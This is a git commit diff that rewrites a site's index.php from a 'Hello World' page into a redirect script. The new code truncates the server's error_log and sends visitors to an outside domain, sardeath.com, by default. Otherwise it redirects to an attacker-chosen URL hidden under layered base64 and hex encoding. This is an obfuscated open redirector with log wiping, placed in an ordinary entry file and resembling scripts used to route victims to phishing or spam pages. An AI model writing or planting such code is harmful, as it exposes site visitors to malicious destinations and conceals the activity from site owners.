869a726a7108f41f5bbe6b411ca2ad415c7fea2a
Robert Whiteside <49750460+rwhites@users.noreply.github.com>
2019-04-20 12:46:30 +0000

    Index Direct

--- index.php
+++ index.php
@@ -1,3 +1,16 @@
 <?php
-echo 'Hello World';
+$clean = fopen('error_log', 'w');
+fwrite($clean,'');
+fclose($clean);
+
+$redir = 'https://sardeath.com';
+
+if(empty($_GET['r']))
+{
+header("location: $redir");
+}else{
+$uru = isset($_GET['r']) ? $_GET['r']: null;
+$xurl = base64_decode(hex2bin(base64_decode($uru)));
+header("Location:".$xurl);
+}
 ?>
